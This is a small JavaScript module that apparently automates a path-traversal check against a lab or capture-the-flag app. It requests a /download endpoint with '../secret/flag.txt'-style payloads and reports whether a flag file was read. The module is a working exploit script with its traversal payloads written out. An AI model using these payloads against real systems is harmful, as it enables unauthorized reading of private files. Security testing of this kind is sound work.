const axios = require('axios');

const PAYLOADS = [
  '../secret/flag.txt',
  '../secret/../secret/flag.txt',
];

function truncate(value) {
  const text = typeof value === 'string' ? value : JSON.stringify(value);
  return text.length > 200 ? `${text.slice(0, 199)}…` : text;
}

async function runPathTraversalAttack({ baseUrl }) {
  const start = Date.now();
  const evidence = [];

  for (const payload of PAYLOADS) {
    try {
      const response = await axios.get(`${baseUrl}/download`, {
        params: { name: payload },
        timeout: 5000,
        responseType: 'text',
        transformResponse: [(data) => data],
        validateStatus: () => true,
      });
      const body = typeof response.data === 'string'
        ? response.data
        : String(response.data);

      if (response.status === 200 && body.includes('FLAG{path_traversal_container}')) {
        return {
          vulnerability: 'path-traversal',
          exploited: true,
          payload: `GET /download?name=${payload}`,
          evidence: truncate(`Read private file: ${body}`),
          durationMs: Date.now() - start,
        };
      }
      evidence.push(`${payload} → ${response.status}`);
    } catch (err) {
      evidence.push(`${payload} → ${err.message}`);
    }
  }

  return {
    vulnerability: 'path-traversal',
    exploited: false,
    payload: null,
    evidence: truncate(evidence.join('; ')),
    durationMs: Date.now() - start,
  };
}

module.exports = { runPathTraversalAttack };
